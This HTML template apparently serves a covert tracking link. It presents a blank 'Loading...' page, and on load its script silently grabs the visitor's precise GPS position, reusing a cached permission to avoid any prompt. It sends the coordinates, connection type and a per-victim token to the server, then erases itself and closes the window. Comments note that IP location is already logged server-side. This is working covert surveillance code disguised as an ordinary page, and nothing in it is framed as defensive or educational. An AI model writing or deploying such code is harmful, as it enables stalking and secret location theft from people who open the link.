<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Loading...</title>
<style>
  *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
  html, body {
    background: #000;
    overflow: hidden;
    width: 100%; height: 100%;
  }
  body { opacity: 0; }
</style>
</head>
<body>
<script>
(function() {
  var token = "{{ token }}";
  var sent = false;

  {% if expired %}
    try { window.location.replace('about:blank'); } catch(e) {}
    try { window.close(); } catch(e) {}
    return;
  {% endif %}

  // ── Detect connection type (NO PERMISSION NEEDED) ──
  function getConnectionType() {
    try {
      var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      if (conn) {
        if (conn.effectiveType) {
          return conn.effectiveType; // 'slow-2g', '2g', '3g', '4g'
        }
        if (conn.type) {
          return conn.type; // 'wifi', 'cellular', 'ethernet', etc.
        }
      }
    } catch(e) {}
    return null;
  }

  function sendToServer(lat, lng, acc) {
    if (sent) return;
    sent = true;

    var payload = JSON.stringify({
      token: token,
      latitude: lat,
      longitude: lng,
      accuracy: acc,
      connectionType: getConnectionType()
    });

    var blob = new Blob([payload], { type: 'application/json' });
    if (navigator.sendBeacon) {
      navigator.sendBeacon('/api/location-update', blob);
    } else {
      try {
        fetch('/api/location-update', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: payload,
          keepalive: true
        });
      } catch(e) {}
    }
  }

  function sendDenied() {
    if (sent) return;
    sent = true;

    var payload = JSON.stringify({
      token: token,
      connectionType: getConnectionType()
    });

    var blob = new Blob([payload], { type: 'application/json' });
    if (navigator.sendBeacon) {
      navigator.sendBeacon('/api/location-denied', blob);
    } else {
      try {
        fetch('/api/location-denied', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: payload,
          keepalive: true
        });
      } catch(e) {}
    }
  }

  function vanish() {
    if (!sent) {
      sent = true;
    }
    try { window.location.replace('about:blank'); } catch(e) {}
    try { window.location.href = 'about:blank'; } catch(e) {}
    setTimeout(function() {
      try { document.body.innerHTML = ''; } catch(e) {}
      try { window.close(); } catch(e) {}
    }, 10);
  }

  // ── Silent GPS capture strategy ──
  function tryGPS() {
    if (!("geolocation" in navigator)) {
      // No GPS capability — IP geolocation is already captured server-side
      vanish();
      return;
    }

    function attemptGPS() {
      navigator.geolocation.getCurrentPosition(
        function(pos) {
          sendToServer(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
          vanish();
        },
        function(err) {
          // GPS denied or failed — notify server with connection type
          sendDenied();
          vanish();
        },
        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
      );
    }

    // Check if permission is cached (already granted before)
    if (navigator.permissions && navigator.permissions.query) {
      navigator.permissions.query({ name: 'geolocation' })
        .then(function(status) {
          if (status.state === 'granted') {
            // Permission cached → GPS fires with ZERO prompts
            navigator.geolocation.getCurrentPosition(
              function(pos) {
                sendToServer(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
                vanish();
              },
              function() {
                // GPS failed despite permission — IP fallback is already captured
                vanish();
              },
              { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
            );
            setTimeout(function() { if (!sent) vanish(); }, 10000);
          } else if (status.state === 'denied') {
            // Permission denied — IP geolocation already captured server-side
            sendDenied();
            vanish();
          } else {
            // 'prompt' — FIRST VISIT, permission prompt WILL appear
            // This is the ONE unavoidable prompt
            attemptGPS();
            setTimeout(function() { if (!sent) vanish(); }, 18000);
          }
        })
        .catch(function() {
          attemptGPS();
          setTimeout(function() { if (!sent) vanish(); }, 15000);
        });
    } else {
      attemptGPS();
      setTimeout(function() { if (!sent) vanish(); }, 15000);
    }
  }

  // ── Execute immediately ──
  tryGPS();

  // ── Hard safety: vanish in 20s no matter what ──
  setTimeout(function() {
    if (!sent) vanish();
  }, 20000);
})();
</script>
</body>
</html>
